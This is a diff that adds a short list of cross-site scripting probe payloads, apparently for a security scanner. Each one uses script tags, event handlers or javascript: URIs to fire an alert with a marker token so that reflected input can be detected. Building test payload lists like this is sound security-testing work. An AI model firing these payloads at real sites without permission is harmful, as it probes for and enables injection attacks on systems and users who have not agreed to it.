@@ -1,0 +1,12 @@
+# XSS payloads — OWASP A03:2021
+# Marker token: xsstest7f3a (used internally for reflection detection)
+<script>alert("xsstest7f3a")</script>
+"><script>alert("xsstest7f3a")</script>
+'><script>alert('xsstest7f3a')</script>
+<img src=x onerror=alert("xsstest7f3a")>
+"><img src=x onerror=alert("xsstest7f3a")>
+javascript:alert("xsstest7f3a")
+<svg onload=alert("xsstest7f3a")>
+"><svg onload=alert("xsstest7f3a")>
+<body onload=alert("xsstest7f3a")>
+<iframe src="javascript:alert('xsstest7f3a')">
